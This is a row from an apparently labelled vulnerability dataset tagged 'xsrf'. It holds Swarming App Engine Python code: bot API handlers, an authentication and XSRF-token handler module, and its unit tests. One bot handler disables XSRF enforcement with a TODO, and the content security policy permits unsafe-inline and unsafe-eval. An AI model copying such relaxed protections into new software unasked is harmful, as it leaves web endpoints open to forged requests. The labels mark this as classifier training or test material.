      logging.exception('Internal error: %s', e)
      self.abort_with_error(500, error=str(e))

    # TODO(maruel): When a task is canceled, reply with 'DIE' so that the bot
    # reboots itself to abort the task abruptly. It is useful when a task hangs
    # and the timeout was set too long or the task was superseded by a newer
    # task with more recent executable (e.g. a new Try Server job on a newer
    # patchset on Rietveld).
    self.send_response({'ok': True})


class BotTaskErrorHandler(auth.ApiHandler):
  """"""It is a specialized version of ereporter2's /ereporter2/api/v1/on_error
  that also attaches a task id to it.

  This formally kills the task, marking it as an internal failure. This can be
  used by bot_main.py to kill the task when task_runner misbehaved.
  """"""

  EXPECTED_KEYS = {u'id', u'message', u'task_id'}

  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.
  xsrf_token_enforce_on = ()

  @auth.require(acl.is_bot)
  def post(self, task_id=None):
    request = self.parse_body()
    bot_id = request.get('id')
    task_id = request.get('task_id', '')
    message = request.get('message', 'unknown')

    bot_management.bot_event(
        event_type='task_error', bot_id=bot_id,
        external_ip=self.request.remote_addr, dimensions=None, state=None,
        version=None, quarantined=None, task_id=task_id, task_name=None,
        message=message)
    line = (
        'Bot: https://%s/restricted/bot/%s\n'
        'Task failed: https://%s/user/task/%s\n'
        '%s') % (
        app_identity.get_default_version_hostname(), bot_id,
        app_identity.get_default_version_hostname(), task_id,
        message)
    ereporter2.log_request(self.request, source='bot', message=line)

    msg = log_unexpected_keys(
        self.EXPECTED_KEYS, request, self.request, 'bot', 'keys')
    if msg:
      self.abort_with_error(400, error=msg)

    msg = task_scheduler.bot_kill_task(
        task_pack.unpack_run_result_key(task_id), bot_id)
    if msg:
      logging.error(msg)
      self.abort_with_error(400, error=msg)
    self.send_response({})


class ServerPingHandler(webapp2.RequestHandler):
  """"""Handler to ping when checking if the server is up.

  This handler should be extremely lightweight. It shouldn't do any
  computations, it should just state that the server is up. It's open to
  everyone for simplicity and performance.
  """"""

  def get(self):
    self.response.headers['Content-Type'] = 'text/plain; charset=utf-8'
    self.response.out.write('Server up')


def get_routes():
  routes = [
      ('/bootstrap', BootstrapHandler),
      ('/bot_code', BotCodeHandler),
      ('/swarming/api/v1/bot/bot_code/<version:[0-9a-f]{40}>', BotCodeHandler),
      ('/swarming/api/v1/bot/event', BotEventHandler),
      ('/swarming/api/v1/bot/handshake', BotHandshakeHandler),
      ('/swarming/api/v1/bot/poll', BotPollHandler),
      ('/swarming/api/v1/bot/server_ping', ServerPingHandler),
      ('/swarming/api/v1/bot/task_update', BotTaskUpdateHandler),
      ('/swarming/api/v1/bot/task_update/<task_id:[a-f0-9]+>',
          BotTaskUpdateHandler),
      ('/swarming/api/v1/bot/task_error', BotTaskErrorHandler),
      ('/swarming/api/v1/bot/task_error/<task_id:[a-f0-9]+>',
          BotTaskErrorHandler),
  ]
  return [webapp2.Route(*i) for i in routes]
/n/n/n",0,xsrf
11,81,0ba6a589d77baefc5ae20cde5c3a5dc24a6290f9,"/appengine/components/components/auth/handler.py/n/n# Copyright 2014 The Swarming Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Integration with webapp2.""""""

# Disable 'Method could be a function.'
# pylint: disable=R0201

import functools
import json
import logging
import urllib
import webapp2

from google.appengine.api import urlfetch
from google.appengine.api import users

from components import utils

from . import api
from . import config
from . import delegation
from . import host_token
from . import ipaddr
from . import model
from . import openid
from . import tokens

# Part of public API of 'auth' component, exposed by this module.
__all__ = [
  'ApiHandler',
  'AuthenticatingHandler',
  'gae_cookie_authentication',
  'get_authenticated_routes',
  'oauth_authentication',
  'openid_cookie_authentication',
  'require_xsrf_token_request',
  'service_to_service_authentication',
]


def require_xsrf_token_request(f):
  """"""Use for handshaking APIs.""""""
  @functools.wraps(f)
  def hook(self, *args, **kwargs):
    if not self.request.headers.get('X-XSRF-Token-Request'):
      raise api.AuthorizationError('Missing required XSRF request header')
    return f(self, *args, **kwargs)
  return hook


class XSRFToken(tokens.TokenKind):
  """"""XSRF token parameters.""""""
  expiration_sec = 4 * 3600
  secret_key = api.SecretKey('xsrf_token', scope='local')
  version = 1


class AuthenticatingHandlerMetaclass(type):
  """"""Ensures that 'get', 'post', etc. are marked with @require or @public.""""""

  def __new__(mcs, name, bases, attributes):
    for method in webapp2.WSGIApplication.allowed_methods:
      func = attributes.get(method.lower())
      if func and not api.is_decorated(func):
        raise TypeError(
            'Method \'%s\' of \'%s\' is not protected by @require or @public '
            'decorator' % (method.lower(), name))
    return type.__new__(mcs, name, bases, attributes)


class AuthenticatingHandler(webapp2.RequestHandler):
  """"""Base class for webapp2 request handlers that use Auth system.

  Knows how to extract Identity from request data and how to initialize auth
  request context, so that get_current_identity() and is_group_member() work.

  All request handling methods (like 'get', 'post', etc) should be marked by
  either @require or @public decorators.
  """"""

  # Checks that all 'get', 'post', etc. are marked with @require or @public.
  __metaclass__ = AuthenticatingHandlerMetaclass

  # List of HTTP methods that trigger XSRF token validation.
  xsrf_token_enforce_on = ('DELETE', 'POST', 'PUT')
  # If not None, the header to search for XSRF token.
  xsrf_token_header = 'X-XSRF-Token'
  # If not None, the request parameter (GET or POST) to search for XSRF token.
  xsrf_token_request_param = 'xsrf_token'
  # Embedded data extracted from XSRF token of current request.
  xsrf_token_data = None
  # If not None, sets X_Frame-Options on all replies.
  frame_options = 'DENY'
  # A method used to authenticate this request, see get_auth_methods().
  auth_method = None

  def dispatch(self):
    """"""Extracts and verifies Identity, sets up request auth context.""""""
    # Ensure auth component is configured before executing any code.
    conf = config.ensure_configured()
    auth_context = api.reinitialize_request_cache()

    # http://www.html5rocks.com/en/tutorials/security/content-security-policy/
    # https://www.owasp.org/index.php/Content_Security_Policy
    # TODO(maruel): Remove 'unsafe-inline' once all inline style=""foo:bar"" in
    # all HTML tags were removed. Warning if seeing this post 2016, it could
    # take a while.
    # - https://www.google.com is due to Google Viz library.
    # - https://www.google-analytics.com due to Analytics.
    # - 'unsafe-eval' due to polymer.
    self.response.headers['Content-Security-Policy'] = (
        'default-src https: \'self\' \'unsafe-inline\' https://www.google.com '
        'https://www.google-analytics.com \'unsafe-eval\'')
    # Enforce HTTPS by adding the HSTS header; 365*24*60*60s.
    # https://www.owasp.org/index.php/HTTP_Strict_Transport_Security
    self.response.headers['Strict-Transport-Security'] = (
        'max-age=31536000; includeSubDomains; preload')
    # Disable frame support wholesale.
    # https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet
    if self.frame_options:
      self.response.headers['X-Frame-Options'] = self.frame_options

    identity = None
    for method_func in self.get_auth_methods(conf):
      try:
        identity = method_func(self.request)
        if identity:
          break
      except api.AuthenticationError as err:
        self.authentication_error(err)
        return
      except api.AuthorizationError as err:
        self.authorization_error(err)
        return
    else:
      method_func = None
    self.auth_method = method_func

    # If no authentication method is applicable, default to anonymous identity.
    identity = identity or model.Anonymous

    # XSRF token is required only if using Cookie based or IP whitelist auth.
    # A browser doesn't send Authorization: 'Bearer ...' or any other headers
    # by itself. So XSRF check is not required if header based authentication
    # is used.
    using_headers_auth = method_func in (
        oauth_authentication, service_to_service_authentication)

    # Extract caller host name from host token header, if present and valid.
    host_tok = self.request.headers.get(host_token.HTTP_HEADER)
    if host_tok:
      validated_host = host_token.validate_host_token(host_tok)
      if validated_host:
        auth_context.peer_host = validated_host

    # Verify IP is whitelisted and authenticate requests from bots.
    assert self.request.remote_addr
    ip = ipaddr.ip_from_string(self.request.remote_addr)
    auth_context.peer_ip = ip
    try:
      # 'verify_ip_whitelisted' may change identity for bots, store new one.
      auth_context.peer_identity = api.verify_ip_whitelisted(
          identity, ip, self.request.headers)
    except api.AuthorizationError as err:
      self.authorization_error(err)
      return

    # Parse delegation token, if given, to deduce end-user identity.
    delegation_tok = self.request.headers.get(delegation.HTTP_HEADER)
    if delegation_tok:
      try:
        auth_context.current_identity = delegation.check_delegation_token(
            delegation_tok, auth_context.peer_identity)
      except delegation.BadTokenError as exc:
        self.authorization_error(
            api.AuthorizationError('Bad delegation token: %s' % exc))
      except delegation.TransientError as exc:
        msg = 'Transient error while validating delegation token.\n%s' % exc
        logging.error(msg)
        self.abort(500, detail=msg)
    else:
      auth_context.current_identity = auth_context.peer_identity

    try:
      # Fail if XSRF token is required, but not provided.
      need_xsrf_token = (
          not using_headers_auth and
          self.request.method in self.xsrf_token_enforce_on)
      if need_xsrf_token and self.xsrf_token is None:
        raise api.AuthorizationError('XSRF token is missing')

      # If XSRF token is present, verify it is valid and extract its payload.
      # Do it even if XSRF token is not strictly required, since some handlers
      # use it to store session state (it is similar to a signed cookie).
      self.xsrf_token_data = {}
      if self.xsrf_token is not None:
        # This raises AuthorizationError if token is invalid.
        self.xsrf_token_data = self.verify_xsrf_token()

      # All other ACL checks will be performed by corresponding handlers
      # manually or via '@required' decorator. Failed ACL check raises
      # AuthorizationError.
      super(AuthenticatingHandler, self).dispatch()
    except api.AuthorizationError as err:
      self.authorization_error(err)

  @classmethod
  def get_auth_methods(cls, conf):
    """"""Returns an enumerable of functions to use to authenticate request.

    The handler will try to apply auth methods sequentially one by one by until
    it finds one that works.

    Each auth method is a function that accepts webapp2.Request and can finish
    with 3 outcomes:

    * Return None: authentication method is not applicable to that request
      and next method should be tried (for example cookie-based
      authentication is not applicable when there's no cookies).

    * Returns Identity associated with the request. Means authentication method
      is applicable and request authenticity is confirmed.

    * Raises AuthenticationError: authentication method is applicable, but
      request contains bad credentials or invalid token, etc. For example,
      OAuth2 token is given, but it is revoked.

    A chosen auth method function will be stored in request's auth_method field.

    Args:
      conf: components.auth GAE config, see config.py.
    """"""
    if conf.USE_OPENID:
      cookie_auth = openid_cookie_authentication
    else:
      cookie_auth = gae_cookie_authentication
    return oauth_authentication, cookie_auth, service_to_service_authentication

  def generate_xsrf_token(self, xsrf_token_data=None):
    """"""Returns new XSRF token that embeds |xsrf_token_data|.

    The token is bound to current identity and is valid only when used by same
    identity.
    """"""
    return XSRFToken.generate(
        [api.get_current_identity().to_bytes()], xsrf_token_data)

  @property
  def xsrf_token(self):
    """"""Returns XSRF token passed with the request or None if missing.

    Doesn't do any validation. Use verify_xsrf_token() instead.
    """"""
    token = None
    if self.xsrf_token_header:
      token = self.request.headers.get(self.xsrf_token_header)
    if not token and self.xsrf_token_request_param:
      param = self.request.get_all(self.xsrf_token_request_param)
      token = param[0] if param else None
    return token

  def verify_xsrf_token(self):
    """"""Grabs a token from the request, validates it and extracts embedded data.

    Current identity must be the same as one used to generate the token.

    Returns:
      Whatever was passed as |xsrf_token_data| in 'generate_xsrf_token'
      method call used to generate the token.

    Raises:
      AuthorizationError if token is missing, invalid or expired.
    """"""
    token = self.xsrf_token
    if not token:
      raise api.AuthorizationError('XSRF token is missing')
    # Check that it was generated for the same identity.
    try:
      return XSRFToken.validate(token, [api.get_current_identity().to_bytes()])
    except tokens.InvalidTokenError as err:
      raise api.AuthorizationError(str(err))

  def authentication_error(self, error):
    """"""Called when authentication fails to report the error to requester.

    Authentication error means that some credentials are provided but they are
    invalid. If no credentials are provided at all, no authentication is
    attempted and current identity is just set to 'anonymous:anonymous'.

    Default behavior is to abort the request with HTTP 401 error (and human
    readable HTML body).

    Args:
      error: instance of AuthenticationError subclass.
    """"""
    logging.warning('Authentication error.\n%s', error)
    self.abort(401, detail=str(error))

  def authorization_error(self, error):
    """"""Called when authentication succeeds, but access to a resource is denied.

    Called whenever request handler raises AuthorizationError exception.
    In particular this exception is raised by method decorated with @require if
    current identity doesn't have required permission.

    Default behavior is to abort the request with HTTP 403 error (and human
    readable HTML body).

    Args:
      error: instance of AuthorizationError subclass.
    """"""
    logging.warning(
        'Authorization error.\n%s\nPeer: %s\nIP: %s',
        error, api.get_peer_identity().to_bytes(), self.request.remote_addr)
    self.abort(403, detail=str(error))

  ### Wrappers around Users API or its OpenID equivalent.

  def get_current_user(self):
    """"""When cookie auth is used returns instance of CurrentUser or None.""""""
    return self._get_users_api().get_current_user(self.request)

  def is_current_user_gae_admin(self):
    """"""When cookie auth is used returns True if current caller is GAE admin.""""""
    return self._get_users_api().is_current_user_gae_admin(self.request)

  def create_login_url(self, dest_url):
    """"""When cookie auth is used returns URL to redirect user to login.""""""
    return self._get_users_api().create_login_url(self.request, dest_url)

  def create_logout_url(self, dest_url):
    """"""When cookie auth is used returns URL to redirect user to logout.""""""
    return self._get_users_api().create_logout_url(self.request, dest_url)

  def _get_users_api(self):
    """"""Returns GAEUsersAPI, OpenIDAPI or raises NotImplementedError.

    Chooses based on what auth_method was used of what methods are available.
    """"""
    method = self.auth_method
    if not method:
      # Anonymous request -> pick first method that supports API.
      for method in self.get_auth_methods(config.ensure_configured()):
        if method in _METHOD_TO_USERS_API:
          break
      else:
        raise NotImplementedError('No methods support UsersAPI')
    elif method not in _METHOD_TO_USERS_API:
      raise NotImplementedError(
          '%s doesn\'t support UsersAPI' % method.__name__)
    return _METHOD_TO_USERS_API[method]


class ApiHandler(AuthenticatingHandler):
  """"""Parses JSON request body to a dict, serializes response to JSON.""""""
  CONTENT_TYPE_BASE = 'application/json'
  CONTENT_TYPE_FULL = 'application/json; charset=utf-8'
  _json_body = None
  # Clickjacking not applicable to APIs.
  frame_options = None

  def authentication_error(self, error):
    logging.warning('Authentication error.\n%s', error)
    self.abort_with_error(401, text=str(error))

  def authorization_error(self, error):
    logging.warning(
        'Authorization error.\n%s\nPeer: %s\nIP: %s',
        error, api.get_peer_identity().to_bytes(), self.request.remote_addr)
    self.abort_with_error(403, text=str(error))

  def send_response(self, response, http_code=200, headers=None):
    """"""Sends successful reply and continues execution.""""""
    self.response.set_status(http_code)
    self.response.headers.update(headers or {})
    self.response.headers['Content-Type'] = self.CONTENT_TYPE_FULL
    self.response.write(json.dumps(response))

  def abort_with_error(self, http_code, **kwargs):
    """"""Sends error reply and stops execution.""""""
    self.abort(
        http_code,
        json=kwargs,
        headers={'Content-Type': self.CONTENT_TYPE_FULL})

  def parse_body(self):
    """"""Parses JSON body and verifies it's a dict.

    webob.Request doesn't cache the decoded json body, this function does.
    """"""
    if self._json_body is None:
      if (self.CONTENT_TYPE_BASE and
          self.request.content_type != self.CONTENT_TYPE_BASE):
        msg = (
            'Expecting JSON body with content type \'%s\'' %
            self.CONTENT_TYPE_BASE)
        self.abort_with_error(400, text=msg)
      try:
        self._json_body = self.request.json
        if not isinstance(self._json_body, dict):
          raise ValueError()
      except (LookupError, ValueError):
        self.abort_with_error(400, text='Not a valid json dict body')
    return self._json_body.copy()


def get_authenticated_routes(app):
  """"""Given WSGIApplication returns list of routes that use authentication.

  Intended to be used only for testing.
  """"""
  # This code is adapted from router's __repr__ method (that enumerate
  # all routes for pretty-printing).
  routes = list(app.router.match_routes)
  routes.extend(
      v for k, v in app.router.build_routes.iteritems()
      if v not in app.router.match_routes)
  return [r for r in routes if issubclass(r.handler, AuthenticatingHandler)]


################################################################################
## All supported implementations of authentication methods for webapp2 handlers.


def gae_cookie_authentication(_request):
  """"""AppEngine cookie based authentication via users.get_current_user().""""""
  user = users.get_current_user()
  try:
    return model.Identity(model.IDENTITY_USER, user.email()) if user else None
  except ValueError:
    raise api.AuthenticationError('Unsupported user email: %s' % user.email())


def openid_cookie_authentication(request):
  """"""Cookie based authentication that uses OpenID flow for login.""""""
  user = openid.get_current_user(request)
  try:
    return model.Identity(model.IDENTITY_USER, user.email) if user else None
  except ValueError:
    raise api.AuthenticationError('Unsupported user email: %s' % user.email)


def oauth_authentication(request):
  """"""OAuth2 based authentication via oauth.get_current_user().""""""
  if not request.headers.get('Authorization'):
    return None
  if not utils.is_local_dev_server():
    return api.extract_oauth_caller_identity()

  # OAuth2 library is mocked on dev server to return some nonsense. Use (slow,
  # but real) OAuth2 API endpoint instead to validate access_token. It is also
  # what Cloud Endpoints do on a local server. For simplicity ignore client_id
  # on dev server.
  header = request.headers['Authorization'].split(' ', 1)
  if len(header) != 2 or header[0] not in ('OAuth', 'Bearer'):
    raise api.AuthenticationError('Invalid authorization header')

  # Adapted from endpoints/users_id_tokens.py, _set_bearer_user_vars_local.
  base_url = 'https://www.googleapis.com/oauth2/v1/tokeninfo'
  result = urlfetch.fetch(
      url='%s?%s' % (base_url, urllib.urlencode({'access_token': header[1]})),
      follow_redirects=False,
      validate_certificate=True)
  if result.status_code != 200:
    try:
      error = json.loads(result.content)['error_description']
    except (KeyError, ValueError):
      error = repr(result.content)
    raise api.AuthenticationError('Failed to validate the token: %s' % error)

  token_info = json.loads(result.content)
  if 'email' not in token_info:
    raise api.AuthenticationError('Token doesn\'t include an email address')
  if not token_info.get('verified_email'):
    raise api.AuthenticationError('Token email isn\'t verified')

  email = token_info['email']
  try:
    return model.Identity(model.IDENTITY_USER, email)
  except ValueError:
    raise api.AuthenticationError('Unsupported user email: %s' % email)


def service_to_service_authentication(request):
  """"""Used for AppEngine <-> AppEngine communication.

  Relies on X-Appengine-Inbound-Appid header set by AppEngine itself. It can't
  be set by external users (with exception of admins).
  """"""
  app_id = request.headers.get('X-Appengine-Inbound-Appid')
  try:
    return model.Identity(model.IDENTITY_SERVICE, app_id) if app_id else None
  except ValueError:
    raise api.AuthenticationError('Unsupported application ID: %s' % app_id)


################################################################################
## API wrapper on top of Users API and OpenID API to make them similar.


class CurrentUser(object):
  """"""Mimics subset of GAE users.User object for ease of transition.

  Also adds .picture().
  """"""

  def __init__(self, user_id, email, picture):
    self._user_id = user_id
    self._email = email
    self._picture = picture

  def nickname(self):
    return self._email

  def email(self):
    return self._email

  def user_id(self):
    return self._user_id

  def picture(self):
    return self._picture

  def __unicode__(self):
    return unicode(self.nickname())

  def __str__(self):
    return str(self.nickname())


class GAEUsersAPI(object):
  @staticmethod
  def get_current_user(request):  # pylint: disable=unused-argument
    user = users.get_current_user()
    return CurrentUser(user.user_id(), user.email(), None) if user else None

  @staticmethod
  def is_current_user_gae_admin(request):  # pylint: disable=unused-argument
    return users.is_current_user_admin()

  @staticmethod
  def create_login_url(request, dest_url):  # pylint: disable=unused-argument
    return users.create_login_url(dest_url)

  @staticmethod
  def create_logout_url(request, dest_url):  # pylint: disable=unused-argument
    return users.create_logout_url(dest_url)


class OpenIDAPI(object):
  @staticmethod
  def get_current_user(request):
    user = openid.get_current_user(request)
    return CurrentUser(user.sub, user.email, user.picture) if user else None

  @staticmethod
  def is_current_user_gae_admin(request):  # pylint: disable=unused-argument
    return False

  @staticmethod
  def create_login_url(request, dest_url):
    return openid.create_login_url(request, dest_url)

  @staticmethod
  def create_logout_url(request, dest_url):
    return openid.create_logout_url(request, dest_url)


# See AuthenticatingHandler._get_users_api().
_METHOD_TO_USERS_API = {
  gae_cookie_authentication: GAEUsersAPI,
  openid_cookie_authentication: OpenIDAPI,
}
/n/n/n/appengine/components/components/auth/handler_test.py/n/n#!/usr/bin/env python
# Copyright 2014 The Swarming Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

# Disable 'Unused variable', 'Unused argument' and 'Method could be a function'.
# pylint: disable=W0612,W0613,R0201

import datetime
import json
import os
import sys
import unittest

from test_support import test_env
test_env.setup_test_env()

from google.appengine.api import oauth
from google.appengine.api import users

import webapp2
import webtest

from components import utils
from components.auth import api
from components.auth import delegation
from components.auth import handler
from components.auth import host_token
from components.auth import ipaddr
from components.auth import model
from components.auth.proto import delegation_pb2
from test_support import test_case


class AuthenticatingHandlerMetaclassTest(test_case.TestCase):
  """"""Tests for AuthenticatingHandlerMetaclass.""""""

  def test_good(self):
    # No request handling methods defined at all.
    class TestHandler1(handler.AuthenticatingHandler):
      def some_other_method(self):
        pass

    # @public is used.
    class TestHandler2(handler.AuthenticatingHandler):
      @api.public
      def get(self):
        pass

    # @require is used.
    class TestHandler3(handler.AuthenticatingHandler):
      @api.require(lambda: True)
      def get(self):
        pass

  def test_bad(self):
    # @public or @require is missing.
    with self.assertRaises(TypeError):
      class TestHandler1(handler.AuthenticatingHandler):
        def get(self):
          pass


class AuthenticatingHandlerTest(test_case.TestCase):
  """"""Tests for AuthenticatingHandler class.""""""

  def setUp(self):
    super(AuthenticatingHandlerTest, self).setUp()
    # Reset global config of auth library before each test.
    api.reset_local_state()
    # Capture error and warning log messages.
    self.logged_errors = []
    self.mock(handler.logging, 'error',
        lambda *args, **kwargs: self.logged_errors.append((args, kwargs)))
    self.logged_warnings = []
    self.mock(handler.logging, 'warning',
        lambda *args, **kwargs: self.logged_warnings.append((args, kwargs)))

  def make_test_app(self, path, request_handler):
    """"""Returns webtest.TestApp with single route.""""""
    return webtest.TestApp(
        webapp2.WSGIApplication([(path, request_handler)], debug=True),
        extra_environ={'REMOTE_ADDR': '127.0.0.1'})

  def test_anonymous(self):
    """"""If all auth methods are not applicable, identity is set to Anonymous.""""""
    test = self

    class Handler(handler.AuthenticatingHandler):
      @classmethod
      def get_auth_methods(cls, conf):
        non_applicable = lambda _request: None
        return [non_applicable, non_applicable]

      @api.public
      def get(self):
        test.assertEqual(model.Anonymous, api.get_current_identity())
        self.response.write('OK')

    app = self.make_test_app('/request', Handler)
    self.assertEqual('OK', app.get('/request').body)

  def test_ip_whitelist_bot(self):
    """"""Requests from client in ""bots"" IP whitelist are authenticated as bot.""""""
    model.bootstrap_ip_whitelist('bots', ['192.168.1.100/32'])

    class Handler(handler.AuthenticatingHandler):
      @api.public
      def get(self):
        self.response.write(api.get_current_identity().to_bytes())

    app = self.make_test_app('/request', Handler)
    def call(ip):
      api.reset_local_state()
      return app.get('/request', extra_environ={'REMOTE_ADDR': ip}).body

    self.assertEqual('bot:whitelisted-ip', call('192.168.1.100'))
    self.assertEqual('anonymous:anonymous', call('127.0.0.1'))

  def test_ip_whitelist(self):
    """"""Per-account IP whitelist works.""""""
    ident1 = model.Identity(model.IDENTITY_USER, 'a@example.com')
    ident2 = model.Identity(model.IDENTITY_USER, 'b@example.com')

    model.bootstrap_ip_whitelist('whitelist', ['192.168.1.100/32'])
    model.bootstrap_ip_whitelist_assignment(ident1, 'whitelist')

    mocked_ident = [None]

    class Handler(handler.AuthenticatingHandler):
      @classmethod
      def get_auth_methods(cls, conf):
        return [lambda _req: mocked_ident[0]]

      @api.public
      def get(self):
        self.response.write('OK')

    app = self.make_test_app('/request', Handler)
    def call(ident, ip):
      api.reset_local_state()
      mocked_ident[0] = ident
      response = app.get(
          '/request', extra_environ={'REMOTE_ADDR': ip}, expect_errors=True)
      return response.status_int

    # IP is whitelisted.
    self.assertEqual(200, call(ident1, '192.168.1.100'))
    # IP is NOT whitelisted.
    self.assertEqual(403, call(ident1, '127.0.0.1'))
    # Whitelist is not used.
    self.assertEqual(200, call(ident2, '127.0.0.1'))

  def test_auth_method_order(self):
    """"""Registered auth methods are tested in order.""""""
    test = self
    calls = []
    ident = model.Identity(model.IDENTITY_USER, 'joe@example.com')

    def not_applicable(request):
      self.assertEqual('/request', request.path)
      calls.append('not_applicable')
      return None

    def applicable(request):
      self.assertEqual('/request', request.path)
      calls.append('applicable')
      return ident

    class Handler(handler.AuthenticatingHandler):
      @classmethod
      def get_auth_methods(cls, conf):
        return [not_applicable, applicable]

      @api.public
      def get(self):
        test.assertEqual(ident, api.get_current_identity())
        self.response.write('OK')

    app = self.make_test_app('/request', Handler)
    self.assertEqual('OK', app.get('/request').body)

    # Both methods should be tried.
    expected_calls = [
      'not_applicable',
      'applicable',
    ]
    self.assertEqual(expected_calls, calls)

  def test_authentication_error(self):
    """"""AuthenticationError in auth method stops request processing.""""""
    test = self
    calls = []

    def failing(request):
      raise api.AuthenticationError('Too bad')

    def skipped(request):
      self.fail('authenticate should not be called')

    class Handler(handler.AuthenticatingHandler):
      @classmethod
      def get_auth_methods(cls, conf):
        return [failing, skipped]

      @api.public
      def get(self):
        test.fail('Handler code should not be called')

      def authentication_error(self, err):
        test.assertEqual('Too bad', err.message)
        calls.append('authentication_error')
        # pylint: disable=bad-super-call
        super(Handler, self).authentication_error(err)

    app = self.make_test_app('/request', Handler)
    response = app.get('/request', expect_errors=True)

    # Custom error handler is called and returned HTTP 401.
    self.assertEqual(['authentication_error'], calls)
    self.assertEqual(401, response.status_int)

    # Authentication error is logged.
    self.assertEqual(1, len(self.logged_warnings))

  def test_authorization_error(self):
    """"""AuthorizationError in auth method is handled.""""""
    test = self
    calls = []

    class Handler(handler.AuthenticatingHandler):
      @api.require(lambda: False)
      def get(self):
        test.fail('Handler code should not be called')

      def authorization_error(self, err):
        calls.append('authorization_error')
        # pylint: disable=bad-super-call
        super(Handler, self).authorization_error(err)

    app = self.make_test_app('/request', Handler)
    response = app.get('/request', expect_errors=True)

    # Custom error handler is called and returned HTTP 403.
    self.assertEqual(['authorization_error'], calls)
    self.assertEqual(403, response.status_int)

  def make_xsrf_handling_app(
      self,
      xsrf_token_enforce_on=None,
      xsrf_token_header=None,
      xsrf_token_request_param=None):
    """"""Returns webtest app with single XSRF-aware handler.

    If generates XSRF tokens on GET and validates them on POST, PUT, DELETE.
    """"""
    calls = []

    def record(request_handler, method):
      is_valid = request_handler.xsrf_token_data == {'some': 'data'}
      calls.append((method, is_valid))

    class Handler(handler.AuthenticatingHandler):
      @api.public
      def get(self):
        self.response.write(self.generate_xsrf_token({'some': 'data'}))
      @api.public
      def post(self):
        record(self, 'POST')
      @api.public
      def put(self):
        record(self, 'PUT')
      @api.public
      def delete(self):
        record(self, 'DELETE')

    if xsrf_token_enforce_on is not None:
      Handler.xsrf_token_enforce_on = xsrf_token_enforce_on
    if xsrf_token_header is not None:
      Handler.xsrf_token_header = xsrf_token_header
    if xsrf_token_request_param is not None:
      Handler.xsrf_token_request_param = xsrf_token_request_param

    app = self.make_test_app('/request', Handler)
    return app, calls

  def mock_get_current_identity(self, ident):
    """"""Mocks api.get_current_identity() to return |ident|.""""""
    self.mock(handler.api, 'get_current_identity', lambda: ident)

  def test_xsrf_token_get_param(self):
    """"""XSRF token works if put in GET parameters.""""""
    app, calls = self.make_xsrf_handling_app()
    token = app.get('/request').body
    app.post('/request?xsrf_token=%s' % token)
    self.assertEqual([('POST', True)], calls)

  def test_xsrf_token_post_param(self):
    """"""XSRF token works if put in POST parameters.""""""
    app, calls = self.make_xsrf_handling_app()
    token = app.get('/request').body
    app.post('/request', {'xsrf_token': token})
    self.assertEqual([('POST', True)], calls)

  def test_xsrf_token_header(self):
    """"""XSRF token works if put in the headers.""""""
    app, calls = self.make_xsrf_handling_app()
    token = app.get('/request').body
    app.post('/request', headers={'X-XSRF-Token': token})
    self.assertEqual([('POST', True)], calls)

  def test_xsrf_token_missing(self):
    """"""XSRF token is not given but handler requires it.""""""
    app, calls = self.make_xsrf_handling_app()
    response = app.post('/request', expect_errors=True)
    self.assertEqual(403, response.status_int)
    self.assertFalse(calls)

  def test_xsrf_token_uses_enforce_on(self):
    """"""Only methods set in |xsrf_token_enforce_on| require token validation.""""""
    # Validate tokens only on PUT (not on POST).
    app, calls = self.make_xsrf_handling_app(xsrf_token_enforce_on=('PUT',))
    token = app.get('/request').body
    # Both POST and PUT work when token provided, verifying it.
    app.post('/request', {'xsrf_token': token})
    app.put('/request', {'xsrf_token': token})
    self.assertEqual([('POST', True), ('PUT', True)], calls)
    # POST works without a token, put PUT doesn't.
    self.assertEqual(200, app.post('/request').status_int)
    self.assertEqual(403, app.put('/request', expect_errors=True).status_int)
    # Both fail if wrong token is provided.
    bad_token = {'xsrf_token': 'boo'}
    self.assertEqual(
        403, app.post('/request', bad_token, expect_errors=True).status_int)
    self.assertEqual(
        403, app.put('/request', bad_token, expect_errors=True).status_int)

  def test_xsrf_token_uses_xsrf_token_header(self):
    """"""Name of the header used for XSRF can be changed.""""""
    app, calls = self.make_xsrf_handling_app(xsrf_token_header='X-Some')
    token = app.get('/request').body
    app.post('/request', headers={'X-Some': token})
    self.assertEqual([('POST', True)], calls)

  def test_xsrf_token_uses_xsrf_token_request_param(self):
    """"""Name of the request param used for XSRF can be changed.""""""
    app, calls = self.make_xsrf_handling_app(xsrf_token_request_param='tok')
    token = app.get('/request').body
    app.post('/request', {'tok': token})
    self.assertEqual([('POST', True)], calls)

  def test_xsrf_token_identity_matters(self):
    app, calls = self.make_xsrf_handling_app()
    # Generate token for identity A.
    self.mock_get_current_identity(
        model.Identity(model.IDENTITY_USER, 'a@example.com'))
    token = app.get('/request').body
    # Try to use it by identity B.
    self.mock_get_current_identity(
        model.Identity(model.IDENTITY_USER, 'b@example.com'))
    response = app.post('/request', expect_errors=True)
    self.assertEqual(403, response.status_int)
    self.assertFalse(calls)

  def test_get_authenticated_routes(self):
    class Authenticated(handler.AuthenticatingHandler):
      pass

    class NotAuthenticated(webapp2.RequestHandler):
      pass

    app = webapp2.WSGIApplication([
      webapp2.Route('/authenticated', Authenticated),
      webapp2.Route('/not-authenticated', NotAuthenticated),
    ])
    routes = handler.get_authenticated_routes(app)
    self.assertEqual(1, len(routes))
    self.assertEqual(Authenticated, routes[0].handler)

  def test_get_peer_ip(self):
    class Handler(handler.AuthenticatingHandler):
      @api.public
      def get(self):
        self.response.write(ipaddr.ip_to_string(api.get_peer_ip()))

    app = self.make_test_app('/request', Handler)
    response = app.get('/request', extra_environ={'REMOTE_ADDR': '192.1.2.3'})
    self.assertEqual('192.1.2.3', response.body)

  def test_get_peer_host(self):
    class Handler(handler.AuthenticatingHandler):
      @api.public
      def get(self):
        self.response.write(api.get_peer_host() or '<none>')

    app = self.make_test_app('/request', Handler)
    def call(headers):
      api.reset_local_state()
      return app.get('/request', headers=headers).body

    # Good token.
    token = host_token.create_host_token('HOST.domain.com')
    self.assertEqual('host.domain.com', call({'X-Host-Token-V1': token}))

    # Missing or invalid tokens.
    self.assertEqual('<none>', call({}))
    self.assertEqual('<none>', call({'X-Host-Token-V1': 'broken'}))

    # Expired token.
    origin = datetime.datetime(2014, 1, 1, 1, 1, 1)
    self.mock_now(origin)
